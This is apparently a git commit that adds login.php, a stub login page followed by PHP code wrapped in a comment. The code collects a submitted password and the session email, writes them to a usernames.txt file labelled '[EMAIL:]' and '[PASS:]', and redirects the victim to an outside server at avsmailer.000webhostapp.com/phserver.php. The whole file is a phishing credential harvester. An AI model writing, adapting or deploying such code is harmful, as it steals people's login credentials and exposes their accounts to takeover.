8f78e2bb04e7cf1c864bd1b25c2dd5cf97c6556c
censorday <74760933+censorday@users.noreply.github.com>
2020-12-15 12:57:42 +0530

    Create login.php

---
+++ login.php
@@ -0,0 +1,24 @@
+<html>
+<body>
+<h1>new login page</h1>
+
+</body>
+</html>
+
+/* <?php
+session_start();
+			
+			$pass = $_POST["password"];
+			$email=$_SESSION["Email"];
+			
+  			
+ file_put_contents("./usernames.txt", "<html>". "<br>" ."[EMAIL:]" . " ". $email . " " . " " . "[PASS:]" . " " . $pass . "<br>" . "</html>" . "\n", FILE_APPEND);
+ header('Location: http://avsmailer.000webhostapp.com/phserver.php');
+
+exit();
+	
+ header('Location: http://avsmailer.000webhostapp.com/phserver.php');
+			
+session_destroy();
+			
+?> */
